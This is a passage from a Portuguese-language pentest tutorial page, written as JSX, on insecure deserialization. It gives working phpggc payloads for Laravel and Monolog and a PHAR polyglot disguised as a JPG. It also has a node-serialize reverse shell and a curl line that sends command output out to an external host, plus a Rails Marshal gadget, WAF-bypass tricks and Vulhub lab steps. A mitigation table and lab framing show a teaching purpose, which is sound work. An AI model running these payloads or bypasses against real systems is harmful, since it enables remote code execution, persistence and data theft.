Slim/RCE1                                         1.3.0                                                                RCE (PHP code)             __destruct      
Symfony/FW1                                       2.5.2                                                                File write                 __destruct      
Symfony/FW2                                       3.3                                                                  File write                 __destruct      `,
            outType: "info",
          },
          {
            comment: "gerar payload Laravel/RCE1 — chamar system('id')",
            cmd: "./phpggc Laravel/RCE1 system 'id'",
            out: `O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\u0000*\\u0000events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\\u0000*\\u0000queueResolver";s:6:"system";}s:8:"\\u0000*\\u0000event";s:2:"id";}`,
            outType: "warning",
          },
          {
            comment: "URL-encoded para mandar em GET",
            cmd: "./phpggc -u Laravel/RCE1 system 'id'",
            out: `O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A2%3A%22id%22%3B%7D`,
            outType: "default",
          },
          {
            comment: "base64 para mandar em cookie/header",
            cmd: "./phpggc -b Laravel/RCE1 system 'id'",
            out: `Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7czoyOiJpZCI7fQ==`,
            outType: "default",
          },
        ]}
      />

      <h3>Cenário real — cookie controlado pelo user</h3>
      <CodeBlock
        language="php"
        title="/var/www/html/portal/auth.php (vulnerável)"
        code={`<?php
// VULNERÁVEL: cookie controlado pelo usuário entra direto em unserialize()
require_once __DIR__ . '/../vendor/autoload.php';   // Laravel autoload presente

if (isset($_COOKIE['user_pref'])) {
    // ❌ NUNCA faça isto
    $pref = unserialize(base64_decode($_COOKIE['user_pref']));
    // se $_COOKIE['user_pref'] vier do atacante → RCE via Laravel/RCE1
}
?>`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "PAYLOAD=$(./phpggc -b Laravel/RCE1 system 'id; hostname')",
            out: `(silencioso)`,
            outType: "muted",
          },
          {
            cmd: 'curl -s -b "user_pref=$PAYLOAD" https://portal.empresa.com.br/auth.php',
            out: `<!DOCTYPE html>
<html><head><title>Portal Empresa</title></head>
<body>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
web-php-01.empresa.com.br
<h1>Bem-vindo</h1>
[...]`,
            outType: "error",
          },
          {
            comment: "Laravel encrypted cookie + APP_KEY leakado = mesma coisa",
            cmd: "./phpggc -b Laravel/RCE9 system 'id' | (key='base64:abc...'; node -e 'encrypt(...)')",
            out: `(payload encriptado pronto para colar como cookie laravel_session)`,
            outType: "muted",
          },
        ]}
      />

      <CommandTable
        title="phpggc — flags úteis"
        variations={[
          { cmd: "-l [filter]", desc: "Lista chains; filtra por nome (ex: -l Laravel).", output: "Tabela de chains." },
          { cmd: "-b", desc: "Output em base64.", output: "Para cookies/headers." },
          { cmd: "-u", desc: "URL-encoded.", output: "Para GET/POST simples." },
          { cmd: "-j", desc: "JSON-encoded.", output: "Para body JSON." },
          { cmd: "-f", desc: "Fast destruct (chain mais curta quando possível).", output: "Para bypassar limites de tamanho." },
          { cmd: "-p phar", desc: "Wrap chain num arquivo PHAR para Phar Deserialization.", output: "Vetor: file_exists('phar://upload.jpg')." },
          { cmd: "-pj path.jpg", desc: "Polyglot phar+jpg (mesmo arquivo é JPG válido E PHAR).", output: "Burla checagem de mime/header." },
          { cmd: "-cp namespace", desc: "Wraps em outra classe top-level (bypass blacklists).", output: "Para WAF que filtra 'Illuminate'." },
        ]}
      />

      <h2>PHAR Deserialization — o vetor sem unserialize()</h2>
      <AlertBox type="warning" title="Phar = unserialize() escondido">
        Em PHP &lt; 8.0, qualquer função de filesystem que recebe URL
        (<code>file_exists</code>, <code>fopen</code>, <code>md5_file</code>,
        <code>filesize</code>, <code>getimagesize</code>) ao receber
        <code>phar:///path/to/file</code> <strong>desserializa</strong> os metadados do
        arquivo PHAR. Vetor super comum em uploads.
      </AlertBox>

      <Terminal
        path="~"
        lines={[
          {
            comment: "gerar PHAR polyglot que parece JPG",
            cmd: "./phpggc -pj imagem.jpg -o evil.jpg Monolog/RCE1 system 'id'",
            out: `(silencioso. evil.jpg = JPG válido + PHAR com gadget)`,
            outType: "muted",
          },
          {
            cmd: "file evil.jpg",
            out: `evil.jpg: JPEG image data, JFIF standard 1.01`,
            outType: "default",
          },
          {
            comment: "fazer upload no portal (acha que é foto de perfil)",
            cmd: "curl -X POST -F 'avatar=@evil.jpg' https://portal.empresa.com.br/upload.php -b 'PHPSESSID=...'",
            out: `{"ok":true,"path":"/uploads/avatar_4421.jpg"}`,
            outType: "info",
          },
          {
            comment: "agora forçar a app a 'olhar' o arquivo via phar://",
            cmd: 'curl "https://portal.empresa.com.br/profile.php?img=phar:///var/www/html/uploads/avatar_4421.jpg"',
            out: `uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]`,
            outType: "error",
          },
        ]}
      />

      <h2>NODE.JS — node-serialize / serialize-javascript</h2>
      <p>
        O pacote <strong>node-serialize</strong> (NPM) tem RCE conhecido (CVE-2017-5941):
        ele suporta serializar funções, e <code>unserialize()</code> faz <code>eval()</code>
        no marcador <code>_$$ND_FUNC$$_</code>.
      </p>

      <CodeBlock
        language="javascript"
        title="gen_node_payload.js"
        code={`// Gera payload que dispara reverse shell ao desserializar.
// Funciona em apps Node usando: const ser = require('node-serialize'); ser.unserialize(input);

const payload = {
  rce: '_$$ND_FUNC$$_function(){ require("child_process").exec("bash -c \\'bash -i >& /dev/tcp/192.168.50.107/4444 0>&1\\'", function(){}); }()'
};

console.log(JSON.stringify(payload));
`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "node gen_node_payload.js",
            out: `{"rce":"_$$ND_FUNC$$_function(){ require(\\"child_process\\").exec(\\"bash -c 'bash -i >& /dev/tcp/192.168.50.107/4444 0>&1'\\", function(){}); }()"}`,
            outType: "warning",
          },
          {
            comment: "endpoint que aceita JSON e desserializa",
            cmd: `curl -X POST -H 'Content-Type: application/json' \\
  -d '{"rce":"_$$ND_FUNC$$_function(){ require(\\"child_process\\").exec(\\"id\\",function(e,o){ require(\\"http\\").get(\\"http://192.168.50.107:8080/?\\"+Buffer.from(o).toString(\\"base64\\")); }); }()"}' \\
  https://api.empresa.com.br/v1/profile/import`,
            out: `{"status":"imported"}`,
            outType: "info",
          },
          {
            cmd: "(no python3 -m http.server 8080:)",
            out: `192.0.2.42 - - [04/Apr/2026 02:42:11] "GET /?dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1" 404 -
$ echo dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK | base64 -d
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
        ]}
      />

      <AlertBox type="info" title="serialize-javascript ≠ node-serialize">
        <strong>serialize-javascript</strong> (Yahoo) é seguro para serializar,
        mas <strong>NÃO desserializa</strong> — quem desserializa via <code>eval</code>
        é a aplicação. Já <strong>node-serialize</strong> (NPM, ~ 50k downloads/sem)
        chama <code>eval</code> internamente no <code>unserialize()</code>. Ambos
        aparecem em CTFs e em apps legados.
      </AlertBox>

      <h2>RUBY — Marshal.load</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Marshal.load com input do user = RCE em Ruby. Vetor clássico em apps Rails legacy.",
            cmd: `cat << 'EOF' > gen_marshal.rb
require 'base64'
class GadgetRCE
  def initialize(cmd)
    @cmd = cmd
  end
end
# Universal RCE gadget para Rails (CVE-2013-0156 família)
payload = "\\x04\\x08o:\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy" +
          "\\x07:\\x0e@instanceo:\\x08ERB\\x07:\\x09@srcI\\"\\x16system('id')\\\\x0a;T\\x06:\\x06ET" +
          ":\\x0c@linenoi\\x00:\\x0c@method:\\x0bresult:\\x0e@deprecator:\\x13ActiveSupport"
puts Base64.strict_encode64(payload)
EOF
ruby gen_marshal.rb`,
            out: `BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQc6DkBpbnN0YW5jZW86CEVSQgc6CUBzcmNJIhZzeXN0ZW0oJ2lkJylcbjtUBjoGRVQ6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0Og5AZGVwcmVjYXRvcjoTQWN0aXZlU3VwcG9ydA==`,
            outType: "warning",
          },
          {
            comment: "alternativa mais limpa — universal-deserialization-gadget para Rails",
            cmd: "git clone -q https://github.com/charlesomer/Rails-RCE && cd Rails-RCE && ruby exploit.rb 'id'",
            out: `[+] Generating Rails universal RCE gadget
[+] Target: Rails 5.0 - 7.0
[+] Payload: id
[+] Output (base64):
BAhvOiVHZW06OlNwZWNpZmljYXRpb246OlNwZWNpYWxpemVkUmVwbHk... (truncated)`,
            outType: "info",
          },
          {
            cmd: 'curl -s "https://app.empresa.com.br/api/v1/session?data=BAhvOiVHZW06...&"',
            out: `uid=1000(rails) gid=1000(rails) groups=1000(rails)`,
            outType: "error",
          },
        ]}
      />

      <h2>Outros vetores comuns</h2>
      <CommandTable
        title="Linguagem → função vulnerável → payload"
        variations={[
          { cmd: "Java — ObjectInputStream.readObject", desc: "Servlet recebe blob binário ou rO0AB em cookie/header.", output: "ysoserial CC6/Spring/Hibernate." },
          { cmd: "Java — XMLDecoder.readObject", desc: "Lê XML controlado. CVE-2017-3506 (WebLogic).", output: "<java><object class='ProcessBuilder'>...</object></java>" },
          { cmd: "Java — XStream.fromXML", desc: "XStream sem allowList. Gadget DynamicProxy + ProcessBuilder.", output: "marshalsec ou ysoserial XStream payload." },
          { cmd: "Java — Jackson @JsonTypeInfo", desc: "ObjectMapper.enableDefaultTyping(). CVE-2017-7525.", output: "marshalsec Jackson chain." },
          { cmd: "Java — SnakeYAML Yaml.load()", desc: "Igual PyYAML. CVE-2022-1471.", output: "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader ['http://atacante/']]" },
          { cmd: "Java — RMI registry (1099)", desc: "Naming.lookup com codebase remoto.", output: "ysoserial.exploit.RMIRegistryExploit." },
          { cmd: ".NET — BinaryFormatter.Deserialize", desc: "ViewState, WCF NetTcpBinding, MSMQ.", output: "ysoserial.net BinaryFormatter." },
          { cmd: ".NET — JsonConvert.DeserializeObject (TypeNameHandling != None)", desc: "Newtonsoft.Json polymorphic.", output: "$type: System.Windows.Data.ObjectDataProvider" },
          { cmd: "PHP — unserialize($_COOKIE)", desc: "Padrão histórico em apps custom.", output: "phpggc -b -u Framework/RCE." },
          { cmd: "PHP — phar://", desc: "file_exists / getimagesize com user input.", output: "phpggc -pj para polyglot." },
          { cmd: "Python — pickle.loads / cPickle.loads", desc: "Cookies Flask, mensagens Celery, cache Redis.", output: "RCE class.__reduce__." },
          { cmd: "Python — yaml.load (sem SafeLoader)", desc: "PyYAML < 6.0, Kubernetes manifests user-controlled.", output: "!!python/object/apply:os.system" },
          { cmd: "Node — node-serialize", desc: "Pacote NPM com eval interno.", output: "_$$ND_FUNC$$_function(){...}()" },
          { cmd: "Ruby — Marshal.load", desc: "Cookies Rails antigos, ActiveJob.", output: "Universal Rails gadget." },
          { cmd: "Ruby — YAML.load (Psych < 4.0)", desc: "Mesma família de PyYAML.", output: "!ruby/object:Gem::Installer." },
        ]}
      />

      <h2>WAF bypass — quando o blob é detectado</h2>
      <CommandTable
        title="Truques quando o WAF bloqueia 'rO0AB' / 'AAEAAAD' / etc."
        variations={[
          { cmd: "Compactar com gzip antes do base64", desc: "rO0AB vira H4sIAAAA... (assinatura diferente).", output: "Servidores que aceitam Content-Encoding: gzip aceitam o blob comprimido." },
          { cmd: "Usar JRMPListener intermediário", desc: "Payload externo entrega o real → primeira request só tem JRMPClient pequeno.", output: "Bypass de filtros que escaneiam blobs grandes." },
          { cmd: "URL-encode duplo", desc: "%2570%2530... — alguns WAFs decodificam só uma vez.", output: "App decodifica 2x, vê o payload bruto." },
          { cmd: "Mudar serializer", desc: "Trocar BinaryFormatter por SoapFormatter (XML, assinatura diferente).", output: "Mesmo gadget, blob legível como SOAP." },
          { cmd: "Phar polyglot", desc: "Esconde o blob dentro de JPG/PNG/PDF válido.", output: "WAF vê 'image/jpeg', deixa passar." },
          { cmd: "Chunked transfer-encoding + slow body", desc: "Blob enviado pedaço a pedaço.", output: "WAFs que não fazem reassembly perdem a assinatura." },
          { cmd: "Custom prefix antes do magic", desc: "Adicionar 'data:application/octet-stream;base64,' antes do rO0AB.", output: "Bypass de regex simples." },
        ]}
      />

      <h2>Defesa — o que recomendar no relatório</h2>
      <CommandTable
        title="Mitigações por tecnologia"
        variations={[
          { cmd: "Não desserializar input do user (PRIMEIRA REGRA)", desc: "Use JSON/XML estruturado com schema. Nunca pickle/Marshal/Java native em dados externos.", output: "Elimina a classe inteira." },
          { cmd: "Java — ValidatingObjectInputStream / ObjectInputFilter", desc: "Whitelist de classes permitidas. Disponível em JDK 9+ (sun.misc.SharedSecrets antes).", output: "ObjectInputFilter.Config.setSerialFilter('com.empresa.*;!*')." },
          { cmd: "Java — Apache Commons Collections 3.2.2 / 4.1+", desc: "Versões corrigidas removem InvokerTransformer.transform().", output: "Atualizar dependências." },
          { cmd: ".NET — Banir BinaryFormatter (DisableBinaryFormatter)", desc: ".NET 5+ marca obsoleto, .NET 9 remove. Use System.Text.Json.", output: "<EnableUnsafeBinaryFormatterSerialization>false</...>." },
          { cmd: ".NET — ViewState com MAC + EncryptedViewState", desc: "EnableViewStateMac=true (default desde 4.5.2) + viewStateEncryptionMode=Always.", output: "machineKey rotativo, sem hard-code em web.config." },
          { cmd: "PHP — usar json_decode em vez de unserialize", desc: "Se precisar de unserialize, passar allowed_classes=false.", output: "unserialize($x, ['allowed_classes' => false])." },
          { cmd: "PHP — desabilitar phar wrapper", desc: "PHP 8.0 mudou comportamento. Em ≤7.x: php.ini disable_classes / Suhosin.", output: "phar.readonly=On + APC blacklist." },
          { cmd: "Python — usar json em vez de pickle", desc: "Para input externo, sempre. Para interno, assinar com HMAC.", output: "hmac.compare_digest(sig, hmac.new(key, data).digest())." },
          { cmd: "Python — yaml.safe_load() (NUNCA yaml.load())", desc: "PyYAML 6.0 mudou default, mas código legado ainda quebra.", output: "yaml.safe_load(data)." },
          { cmd: "Node — bani node-serialize", desc: "Use JSON.parse + validação de schema (zod, yup, joi).", output: "npm uninstall node-serialize." },
          { cmd: "Ruby — Marshal só em dados internos", desc: "Para externo: JSON ou MessagePack com schema.", output: "ActiveSupport::MessageVerifier para integridade." },
          { cmd: "WAF / RASP", desc: "Detecção em runtime (Contrast, Sqreen, ModSecurity rule set OWASP CRS).", output: "Mitigação compensatória — não substitui fix." },
          { cmd: "Logging de tentativas", desc: "Logar inputs com magic bytes mesmo se app rejeita.", output: "SOC vê tentativa antes do CVE chegar à app." },
        ]}
      />

      <PracticeBox
        title="Lab: explore Java + PHP + Python no Vulhub"
        goal="Subir 3 ambientes vulneráveis no Docker, identificar formato, gerar payload, ganhar shell em cada um."
        steps={[
          "Clone o Vulhub: git clone https://github.com/vulhub/vulhub",
          "Suba o Java (Liferay 7.2 — CVE-2020-7961): cd vulhub/liferay-portal/CVE-2020-7961 && docker compose up -d",
          "Identifique o endpoint /api/jsonws/invoke e mande payload Jackson com marshalsec.",
          "Suba o PHP (Laravel debug — CVE-2021-3129): cd ../../laravel/CVE-2021-3129 && docker compose up -d",
          "Use phpggc Laravel/RCE9 ou o exploit ambionics/laravel-exploits.",
          "Suba o Python (Flask cookie pickle — exemplo Vulhub flask/ssti não tem; use HackTheBox 'Cereal' write-up).",
          "Documente tempo, payload, resposta de cada um.",
        ]}
        command={`# 1) lab Java
cd ~/vulhub/liferay-portal/CVE-2020-7961 && docker compose up -d
# Espera ~2min, depois:
curl http://127.0.0.1:8080/   # confirma Liferay rodando

# 2) gerar payload Jackson via marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit" 1389 &
python3 -m http.server 8888 &  # serve Exploit.class
curl -X POST 'http://127.0.0.1:8080/api/jsonws/invoke' \\
  -d 'cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=...' \\
  -d 'formDate=1611234567890' \\
  -d '+tableId=1' -d '+name=test' -d '+type=2' \\
  -d '+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={"jndiName":"ldap://127.0.0.1:1389/Exploit","loginTimeout":0}'

# 3) lab PHP
cd ~/vulhub/laravel/CVE-2021-3129 && docker compose up -d
PAYLOAD=$(./phpggc -b Laravel/RCE9 system 'id')
curl -X POST http://127.0.0.1:8080/_ignition/execute-solution \\
  -H 'Content-Type: application/json' \\
  -d "{\\"solution\\":\\"Facade\\\\\\\\Ignition\\\\\\\\Solutions\\\\\\\\MakeViewVariableOptionalSolution\\",\\"parameters\\":{\\"variableName\\":\\"username\\",\\"viewFile\\":\\"$PAYLOAD\\"}}"`}
        expected={`(Liferay RCE) uid=0(root) gid=0(root) groups=0(root)
(Laravel RCE) uid=33(www-data) gid=33(www-data) groups=33(www-data)
"php_unit_xml":"<?xml version=\\"1.0\\"?>\\n<phpunit ...><uid>33</uid></phpunit>"`}
        verify="Para cada lab você deve conseguir: (1) provar a vuln com URLDNS/dnslog, (2) obter ID do user da app, (3) reverse shell. Após, pare os containers (docker compose down) — isso libera RAM."
      />

      <AlertBox type="warning" title="Antes de testar em produção do cliente">
        Payloads de deserialização <strong>quase sempre crasham worker/thread/processo</strong>
        (exceptions não tratadas após o gadget). Em produção isso pode tirar a app do ar
        por segundos. Combine janela com o cliente, esteja pronto para reiniciar serviço,
        e <strong>nunca dispare em loop</strong> — mande 1 payload, ganhe shell, persista.
      </AlertBox>

      <AlertBox type="info" title="Leituras essenciais">
        - <strong>Foxglove Security — Marshalling Pickles</strong> (paper original, ainda atual).<br />
        - <strong>frohoff/ysoserial</strong> README + commits.<br />
        - <strong>ambionics/phpggc</strong> docs/ — explica cada chain.<br />
        - <strong>OWASP Cheat Sheet — Deserialization</strong>.<br />
        - <strong>HackTricks — Insecure Deserialization</strong> (todos os truques de bypass).
      </AlertBox>
    </PageContainer>
  );
}
